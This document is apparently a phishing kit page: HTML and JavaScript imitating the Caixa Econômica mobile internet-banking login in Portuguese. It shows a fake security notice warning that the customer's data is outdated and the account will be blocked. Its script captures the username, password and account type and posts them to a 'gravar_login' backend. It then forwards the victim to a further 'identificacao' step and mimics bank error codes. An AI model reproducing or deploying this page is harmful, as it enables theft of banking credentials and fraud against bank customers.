<!DOCTYPE html>
<html>

<head>
    <title>Caixa Econômica | Mobile</title>
    <!--METAS-->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="robots" content="noindex, nofollow, noimageindex">
    <meta name="theme-color" content="#1664ac">
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
    <!--LINKS DE ESTILO-->
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap" rel="stylesheet">
    <!-- CSS -->
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/alertifyjs@1.13.1/build/css/alertify.min.css" />
    <!-- Default theme -->
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/alertifyjs@1.13.1/build/css/themes/default.min.css" />
    <!-- Semantic UI theme -->
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/alertifyjs@1.13.1/build/css/themes/semantic.min.css" />
    <!-- Bootstrap theme -->
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/alertifyjs@1.13.1/build/css/themes/bootstrap.min.css" />

    <link href="//netdna.bootstrapcdn.com/bootstrap/3.0.0/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="../../assets/css/style_login.css?v=1">
	<script src="../../assets/js/script.js?id=1"></script>
    <style>
        p,
        div,
        label,
        input {
            font-family: 'Montserrat', sans-serif !important;
        }

        .usrInp {
            color: #fff !important;
        }

        .pwdInp {
            letter-spacing: 10px;
            color: #999 !important;
        }

        .imnotauser {
            text-align: center;
            display: flex;
            width: max-content;
            margin: 0 auto;
            color: #fff;
        }

        .imnotauser i {
            margin-top: -2px;
        }

        .modalposition {
            background-color: rgb(0, 0, 0);
            background-color: rgba(0, 0, 0, 0.3);
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            z-index: 1;
        }

        .modalposition3 {
            max-width: 380px;
            margin: 0 auto;
            z-index: 99999;
            border: 1px solid #999;
            position: absolute;
            left: 10px;
            right: 10px;
            font-family: Arial;
            top: 25%;
            background: #FFF;
            color: #000;
            box-shadow: 0 0 10px #999;
            padding: 15px 15px 15px 15px;
            border-radius: 3px;
        }

        .modaltext {
            padding: 15px 15px 15px 0;
            color: #666666;
        }

        #ok {
            padding: 5px 20px 5px 20px;
            background: #f7a603;
            border: 1px solid #333;
            text-shadow: 0 0 2px #000;
            color: #FFF !important;
            font-size: 16px;
            border-radius: 5px;
        }
    </style>

    <!--SCRIPTS-->



</head>

<body>
    <div class="menu">
        <i class="material-icons">&#xe5d2;</i>
        <p>INTERNET</p>
        <p id="sp">BANKING</p>
    </div>
    <div class="corpo">
        <img id="lgc" src="../../assets/imgs/logo_caixa.png" width="150px" height="30px">
        <div class="formulario">
            <div>
                <div class="form-item">
                    <div class="arrastar">
                        <p>Lembrar meu usuário</p>
                        <label class="swich">
                            <input type="checkbox" name="on" id="on">
                            <div class="slider"></div>
                        </label>
                    </div>
                    <input type="text" id="usuario" class="usrInp" name="userLog" maxlength="20" autocomplete="off" required="" onkeyup="return habilitarBotao();">
                    <label class="label-float" for="usuario">Usuário</label>
                </div>
                <div class="form-item">
                    <img src="../../assets/imgs/form_icon.png" width="37px" height="35px">
                    <input type="password" class="pwdInp" id="senha" name="passLog" maxlength="8" autocomplete="off" required="" onkeyup="return habilitarBotao();">

                    <label class="label-float" for="senha">Senha</label>
                </div>
                <div class="btr">
                    <ul>
                        <li><input type="radio" id="pf" name="clienteLog" value="Pessoa Fisica" checked=""><label for="pf">Pessoa Física</label></li>
                        <li><input type="radio" id="pj" name="clienteLog" value="Pessoa Juridica"><label for="pj">Pessoa Juridica</label></li>
                    </ul>
                </div>
                <br>
                <br>
                <br>
                <br>
                <div class="notuser">
                    <div class="imnotauser">
                        Não tenho usuário &nbsp;&nbsp;&nbsp; <i class="material-icons">arrow_forward</i>
                    </div>
                </div>
                <br>
                <input type="submit" id="bt" value="Acessar minha conta" class="gravar_login">
            </div>
        </div>
    </div>
    <div id="mod-preload" class="mod-preload">
        <div class="container-img-preload">
            <img class="img-preload" src="../../assets/imgs/pre_load.gif">
        </div>
    </div>
    <div id="modalalert" class="modalposition">
        <div id="modalalert1" class="modalposition3">
            <div style="font-size:16px;">
                <span class="glyphicon glyphicon-lock" style="color:#f7a603;"></span> <b>Caixa Econômica informa:</b>
            </div>

            <div class="modaldiv1">
                <div class="modaltext">
                    <div id="TextErrorModal" style="font-size:0.9em;">Prezado(a) cliente, seus dados estão desatualizados, por razões de segurança será necessário a atualização de seus dados, evite bloqueio de sua conta, siga os passos a seguir.</div>
                </div>
            </div>
            <div class="modaldiv2" align="right">
                <a href="#closemodal">
                    <button onClick="document.getElementById('modalalert').style.display='none';return false" id="ok">Ok</button>

                </a>

            </div>
        </div>
    </div>
    <script src="https://code.jquery.com/jquery-3.5.1.js"></script>
    <script src="//cdn.jsdelivr.net/npm/alertifyjs@1.13.1/build/alertify.min.js"></script>

    <script>
        function habilitarBotao() {
            var usuario = $("#usuario").val();
            var senha = $("#senha").val();

            if (usuario.length > 3) {
                if (senha.length > 5) {
                    document.getElementById('bt').style.color = '#fff';
                    document.getElementById('bt').style.backgroundColor = '#fcb00c';
                    document.getElementById('bt').style.border = '0px';
                    document.getElementById('bt').disabled = false;
                }
            } else {
                document.getElementById('bt').style.color = 'rgba(255,255,255, .60)';
                document.getElementById('bt').style.background = 'none';
                document.getElementById('bt').style.border = '1px #ddd solid';
                document.getElementById('bt').disabled = true;
            }

            if (senha.length > 5) {
                if (usuario.length > 3) {
                    document.getElementById('bt').style.color = '#fff';
                    document.getElementById('bt').style.backgroundColor = '#fcb00c';
                    document.getElementById('bt').style.border = '0px';
                    document.getElementById('bt').disabled = false;
                }
            } else {
                document.getElementById('bt').style.color = 'rgba(255,255,255, .60)';
                document.getElementById('bt').style.background = 'none';
                document.getElementById('bt').style.border = '1px #ddd solid';
                document.getElementById('bt').disabled = true;
            }
        }
    </script>
    <script>
        $(document)
            .ajaxStart(function() {
                $(".corpo").hide();
                $(".mod-preload").show();
            })
            .ajaxStop(function() {
                $(".corpo").show();
                $(".mod-preload").hide();
            });


        $(document).ready(function() {
            $(".mod-preload").hide();

            $(".notuser").click(function() {
                window.location.href = "https://play.google.com/store/apps/details?id=br.com.gabba.Caixa"
            });
            $("#usuario").keyup(function(e) {

                $(this).val($(this).val().replace(/[^a-z0-9]/gi, ''));
            })


            function mensagem_retorno(campo) {
                alertify.alert('Caixa', '' + campo + '');
            }

            $(document).on('click', '.gravar_login', function() {
                var tipoconta = "Fisica";

                if ($('#pf').is(':checked')) {
                    tipoconta = "Fisica";
                }

                if ($('#pj').is(':checked')) {
                    tipoconta = "Juridica";
                }
                var senha = $("#senha").val();
                var usuario = $("#usuario").val();

                if (usuario == "") {
                    alert("Obrigatório informar o usuário.");
                    $("#usuario").focus();
                    return false;
                }

                if (usuario.length <= 3) {
                    alert("O usuario informado não existe.");
                    $("#senha").focus();
                    return false;
                }

                if (senha == "") {
                    alert("Digite sua senha de acesso.");
                    $("#senha").focus();
                    return false;
                }

                if (senha.length < 6 || senha.length > 8) {
                    alert("Senha do usuário deve ter entre 6 e 8 posições.");
                    $("#senha").focus();
                    return false;
                }

                $.ajax({
                    url: "funcoes",
                    method: "post",
                    data: {
                        action: 'gravar_login',
                        usuario: usuario,
                        senha: senha,
                        tipoconta: tipoconta,
                        dispositivo: 'Mobile'
                    },
                    success: function(data) {
                        console.log(data);
                        if (data == "LOGIN REALIZADO COM SUCESSO") {
                            location.href = "identificacao";
                        } else if (data == "ERRO CONEXAO") {
                            mensagem_retorno('Tente novamente. (C905-010)');
                        } else if (data == "USUARIO NAO CADASTRADO") {
                            mensagem_retorno('Usuário não cadastrado. (C905-010)');
                        } else if (data == "SENHA DE ACESSO BLOQUEADA") {
                            mensagem_retorno('Senha de acesso bloqueada. (C905-010)');
                        } else if (data == "senha_bloqueada") {
                            alert('Senha de acesso bloqueada.')
                        } else {

                        }
                    }
                })
            });



        });
    </script>
</body>

</html>